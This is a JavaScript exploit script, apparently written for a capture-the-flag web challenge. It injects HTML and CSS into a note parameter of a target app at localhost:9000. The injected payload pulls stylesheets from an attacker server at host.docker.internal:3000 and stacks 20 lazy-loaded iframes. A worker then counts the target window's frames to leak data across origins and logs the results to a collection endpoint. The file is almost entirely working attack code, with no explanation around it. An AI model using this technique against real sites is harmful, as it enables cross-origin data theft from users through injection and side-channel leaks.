const RESOURCES = 'http://host.docker.internal:3000/static'
const API = 'http://host.docker.internal:3000/api'
const TARGET = 'http://localhost:9000/'
const TARGET_RESOURCE = '/login_success.html'
const BIN = '/log'

const CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPURSTUVWXYZ0123456789"
const newID = () => Array(16).fill(0).map(_ => CHARACTERS[Math.floor(Math.random() * CHARACTERS.length)]).join('')

const log = (...args) => fetch(BIN + '?message[]=' + args.join('&message[]='), {mode: 'no-cors'})

var targetwindow

const genpayload = (id, lazyloadthreshold) => {
  const gapheight = lazyloadthreshold - 3000 + 50
  const e = document.createElement('div')
  e.innerHTML = `<style>@import url('${RESOURCES}/init.css');.gap{height: ${gapheight}px};</style><div class="gap"></div>`
  for (let i=0; i < 20; i++) {
    let frame = document.createElement('iframe')
    frame.src = TARGET_RESOURCE
    frame.setAttribute('loading', 'lazy')
    frame.className = 'f' + i
    e.appendChild(frame)
    // frame = document.createElement('iframe')
    // frame.src = TARGET_RESOURCE
    // frame.setAttribute('loading', 'lazy')
    // frame.className = 's' + i
    // e.appendChild(frame)
  }
  const style = document.createElement('style')
  style.innerText = `@import url("${API}/manager.css?id=${id}");`
  e.appendChild(style)
  return e.innerHTML
}

const setuptarget = (payload) => {
  payload = encodeURIComponent(payload)
  return window.open(`${TARGET}?note=${payload}`, 'target')
}

const setupworker = () => {
  let worker = new Worker('./worker.js')
  worker.onmessage = event => {
    const { action, payload } = event.data
    switch(action) {
      case 'framelength':
        worker.postMessage({
          action: 'framelength',
          payload: targetwindow.frames.length > payload && targetwindow.frames[payload].frames.length
        })
        break
      default:
        break
    }
  }
  return worker
}

const main = async () => {
  let lazyloadthreshold = await lazysearch(0, 6000, 'px')
  log('lazyloadthreshold', lazyloadthreshold)
  let id = newID()
  let payload = genpayload(id, lazyloadthreshold)
  targetwindow = setuptarget(payload)
  await sleep(100)
  let numframes = targetwindow.frames.length
  log('numofframes', numframes)
  let worker = setupworker()
  worker.postMessage({
    action: 'start',
    payload: {
      numframes,
      id
    }
  })
}

window.addEventListener('load', main)